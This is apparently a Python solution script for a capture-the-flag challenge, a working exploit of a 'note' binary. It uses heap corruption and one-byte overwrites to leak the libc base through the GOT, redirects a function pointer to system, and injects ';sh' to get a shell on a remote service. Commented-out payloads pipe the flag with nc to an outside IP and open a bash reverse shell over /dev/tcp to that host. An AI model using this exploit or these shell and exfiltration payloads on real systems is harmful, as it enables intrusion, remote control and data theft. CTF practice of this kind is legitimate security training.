#!/usr/bin/env python
# coding:utf-8

# ./exploit.py LIBC=libc-2.23.so MODE=remote
# flag{t1-1_1S_0_sImPl3_n0T3}

from ctf import *

binary = './note'
# context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
if not args['ASLR']:
    context.aslr = False
mode = args['MODE'].lower()
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = os.path.abspath(libc)
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
info('libc: %s', libc)
libc = ELF(libc)


def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    elif mode == 'remote':
        io = remote('39.107.14.183', 1234)
        # io = remote('10.132.141.60', 1234)
        # io = remote('39.107.14.183', 6666)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = remote('0', 1234)

    def change_title(title):
        io.sendlineafter(">>\n", "1")
        io.sendafter("title:", title)

    def change_content(size, content):
        io.sendlineafter(">>\n", "2")
        io.sendlineafter("):", str(size))
        if len(content) < size:
            content += '\n'
        io.sendafter("content:", content)

    def change_comment(comment):
        io.sendlineafter(">>\n", "3")
        comment += '\n'
        io.sendafter('comment:', comment)

    def show_content():
        io.sendlineafter(">>\n", "4")
        io.recvuntil('is:')
        return io.recvuntil('\n1.', drop=True)

    # leak = show_content()
    # leak = leak.ljust(8, '\x00')
    # leak = u64(leak)
    # libc.address = leak - 0x3c4b78
    # info('libc address: %#x', libc.address)

    change_content(0x78, fit({
        0x38: 0x21,
        0x58: 0x21,
    }))
    # io.interactive()

    change_title(
        flat(
            'A' * 8,
            0x25,
            0x602070 - 0x18,
            0x602070 - 0x10,
            0x20,) + '\x40')

    change_content(0x100, 'B')
    change_content(0x21000, 'C')
    #io.interactive()

    change_title(cyclic(0x18) + '\x40')
    change_title(flat('A' * 0x20, elf.got['puts']) + '\n')
    io.sendlineafter(">>\n", "4")
    io.recvuntil('is:')
    puts_addr = unpack(io.recvline(keepends=False), 'all')  # 0x00000000023ca6e0
    libc.address = puts_addr - libc.symbols['puts']
    info('puts address: %#x', puts_addr)
    info('libc base address: %#x', libc.address)
    io.unrecv('\n')
    # print '=' * 100

    # change_title(cyclic(0x18) + '\x0a')
    # change_title(flat('\0' * 0x16, 'A' * 0x20, elf.got['puts']) + '\n')
    change_title(flat('A' * 0x18, 0x602010) + '\n')
    change_comment('\xcc\0')
    # io.interactive()

    # change_title(flat('A' * 0x20, libc.address + 0x3c4ba8) + '\n')
    change_title(
        flat('A' * 0x20, libc.address + 0x3c4b78) + '\xcc')  # small bins
    # io.interactive()
    # show_content()
    io.sendlineafter(">>\n", "4")
    io.recvuntil('is:')
    # print 'fuck' * 100
    # print io.recvline(keepends=False)
    a_heap_ptr = unpack(
        io.recvline(keepends=False),
        'all')  # 0x00000000023ca6e0 0x0000000001b056e0
    a_heap_ptr = a_heap_ptr - 0x90 + 0xcb
    # a_heap_ptr = 0x6020cb
    info('a heap pointer: %#x', a_heap_ptr)
    # change_title(p64(libc.address + 0x3C3FD0, 'all') + '\n')
    # change_content(0x80 - 8, flat('A' * 0x30, 0x40, 0x41, 'A' * 0x38) + "\n")

    change_title(flat('A' * 0x18, a_heap_ptr) + '\xcc')
    # change_comment(';echo flag | nc 0 12345')
    # change_comment(';echo flag | nc 139.224.220.67 12345')
    # change_comment(';/bin/bash -c "echo flag > /dev/tcp/139.224.220.67/12345"')
    # change_comment(';cat flag >&4')
    # change_comment(';while [ 1 ]; do echo 1; done')
    # change_comment(';cat flag')
    change_comment(';sh')
    # change_comment(';bash -c "exec 9<> /dev/tcp/139.224.220.67/12345;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;"')

    change_title(flat('A' * 0x20, a_heap_ptr) + '\xcc')
    std_err = libc.address + 0x3c5540
    # std_err_t = std_err - 0x40
    change_title(flat(std_err, 'A' * 0x8, 0, libc.address + 0x3C4B08) + '\xcc')
    # change_title('\x40')
    # io.interactive()
    info('system address: %#x', libc.symbols['system'])
    change_comment(flat(libc.symbols['system']))
    # change_comment(flat(0x401307))
    # change_comment(flat(0x40130C))

    io.sendlineafter(">>\n", "2")
    io.sendline('1')

    # change_title(
    #     flat(
    #         0,
    #         0x20,
    #         0x602070 - 0x18,
    #         0x602070 - 0x10,
    #         0x20,).ljust(0x28, 'A') +
    #     '\x40')  # 0x0a 0x21 0x3f 0x40 0x22 0x27 0x23 0x26

    # gdb.attach(io, '''
    # ''')
    '''
    dq 0x0000000000602050
    '''

    io.interactive()


if __name__ == '__main__':
    exploit()
